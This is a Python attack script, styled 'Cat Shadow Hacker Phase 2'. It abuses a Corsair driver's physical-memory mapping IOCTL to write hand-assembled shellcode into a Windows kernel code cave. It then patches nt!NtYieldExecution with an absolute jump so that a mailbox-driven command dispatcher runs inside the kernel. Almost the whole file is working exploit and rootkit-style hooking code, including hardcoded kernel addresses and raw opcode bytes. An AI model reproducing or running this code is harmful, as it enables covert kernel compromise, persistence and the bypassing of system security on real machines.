import ctypes
import struct
import sys
import os

# CAT SHADOW HACKER - PHASE 2: KERNEL FUNCTIONALIZATION (FIXED)
# MISSION: UPGRADE HEARTBEAT STUB TO FULL COMMAND DISPATCHER
# RATIONALE: FOLLOWS X64 CALLING CONVENTION & REGISTER PRESERVATION

# Target: nt!NtYieldExecution
HOOK_VA = 0xFFFFF80493D111D0
HOOK_PA = 0x1007111D0

# Cave for our Dispatcher
CAVE_VA = 0xFFFFF80493D111E0
CAVE_PA = 0x1007111E0

# Shared Mailbox
MAILBOX_VA = (CAVE_VA & ~0xFFF) + 0xF00
MAILBOX_PA = (CAVE_PA & ~0xFFF) + 0xF00

# Corsair IOCTLs
IOCTL_MAP_PHYS_MEM = 0x00225374
PAGE_SIZE = 0x1000

kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

def map_page(h, pa):
    pa_base = pa & ~0xFFF
    inp = struct.pack("<QII", pa_base, PAGE_SIZE, 0)
    out = ctypes.c_uint64(0)
    ret = ctypes.c_uint32(0)
    ok = kernel32.DeviceIoControl(h, IOCTL_MAP_PHYS_MEM, inp, 16, ctypes.byref(out), 8, ctypes.byref(ret), None)
    if not ok or not out.value: return None
    return out.value

def write_phys(h, pa, data):
    v = map_page(h, pa)
    if not v: return False
    offset = pa & 0xFFF
    dst = (ctypes.c_ubyte * len(data)).from_address(v + offset)
    for i in range(len(data)):
        dst[i] = data[i]
    return True

def construct_dispatcher_stub(ke_yield_addr, mailbox_va):
    """
    Constructs the Phase 2 Command Dispatcher Shellcode.
    Mailbox Layout:
    +0x00: Command ID (4 bytes)
    +0x04: Status (4 bytes)
    +0x10: Arg1 (8 bytes)
    +0x18: Arg2 (8 bytes)
    +0x20: Arg3 (8 bytes)
    +0x28: Arg4 (8 bytes)
    +0x30: Result (8 bytes)
    +0x40: Heartbeat (1 byte) - 0x77
    """
    
    # 1. Preserve ALL volatile registers + rbx (to use as base)
    # Volatiles: rax, rcx, rdx, r8, r9, r10, r11
    # Pushes (8 * 8 = 64 bytes). RSP becomes 16N + 8 - 64 = 16(N-4) + 8.
    
    stub = [
        0x50, 0x51, 0x52, 0x53, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, # push rax, rcx, rdx, rbx, r8, r9, r10, r11
        # 2. Align stack and provide shadow space
        # Sub 0x28 (40) -> RSP = 16(N-4) + 8 - 40 = 16(N-6). (16-byte aligned)
        0x48, 0x83, 0xEC, 0x28,                         
        
        0x48, 0xB9,                                     # mov rcx, mailbox_va
    ] + list(struct.pack("<Q", mailbox_va)) + [
        0x8B, 0x01,                                     # mov eax, [rcx] (Command ID)
        0x85, 0xC0,                                     # test eax, eax
        0x74, 0x05,                                     # jz heartbeat
        
        # --- Dispatcher Logic Placeholder ---
        # (We fall through for now)
        0x90, 0x90, 0x90,
        
        # heartbeat:
        0xC6, 0x41, 0x40, 0x77,                         # mov byte ptr [rcx + 0x40], 0x77
        
        # 3. Restore stack and registers
        0x48, 0x83, 0xC4, 0x28,                         # add rsp, 28h
        0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5B, 0x5A, 0x59, 0x58, # pop r11..rax
        
        # 4. Safely execute original prologue (Absolute Call)
        0x48, 0x83, 0xEC, 0x28,                         # sub rsp, 28h
        0x33, 0xC9,                                     # xor ecx, ecx
        0x48, 0xB8,                                     # mov rax, ke_yield_addr
    ] + list(struct.pack("<Q", ke_yield_addr)) + [
        0xFF, 0xD0,                                     # call rax
        0x48, 0x83, 0xC4, 0x28,                         # add rsp, 28h
        0xC3                                            # ret
    ]
    
    return bytes(stub)

def main():
    # Attempt to import discovery logic from safe_strike
    sys.path.append(os.getcwd())
    try:
        from safe_strike import enable_debug_privilege, get_kernel_base, pe_export_rva
    except ImportError:
        print("[-] safe_strike.py not found in current directory.")
        return

    if not enable_debug_privilege():
        print("[-] Run as Admin with SeDebugPrivilege enabled."); return
        
    ntos_kva = get_kernel_base()
    if not ntos_kva:
        print("[-] Could not find kernel base."); return
        
    ke_yield_rva = pe_export_rva(r"C:\Windows\System32\ntoskrnl.exe", "KeYieldExecution")
    if not ke_yield_rva:
        print("[-] KeYieldExecution export not found."); return
    ke_yield_addr = ntos_kva + ke_yield_rva
    
    h = kernel32.CreateFileW(r"\\.\CorsairLLAccess64", 0xC0000000, 7, None, 3, 0x80, None)
    if h == -1:
        print("[-] Driver connection failed."); return

    print(f"[*] KeYieldExecution resolved to 0x{ke_yield_addr:X}")
    stub = construct_dispatcher_stub(ke_yield_addr, MAILBOX_VA)
    print(f"[*] Stub size: {len(stub)} bytes")

    print(f"[*] Writing upgraded stub to cave at PA 0x{CAVE_PA:X}...")
    if not write_phys(h, CAVE_PA, stub):
        print("[-] Failed to write stub to physical memory.")
        return

    # Hijack (14 bytes absolute jmp)
    abs_jmp = struct.pack("<HIIQ", 0x25FF, 0, 0, CAVE_VA) + b"\x90\x90"
    
    print("[!] INJECTING PHASE 2 DISPATCHER INTO PHYSICAL KERNEL...")
    if not write_phys(h, HOOK_PA, abs_jmp):
        print("[-] Hijack injection failed.")
        return

    print("[+] SUCCESS! Phase 2 Dispatcher is active and safe.")
    print(f"[*] Mailbox ready at VA 0x{MAILBOX_VA:X}")
    kernel32.CloseHandle(h)

if __name__ == "__main__":
    main()
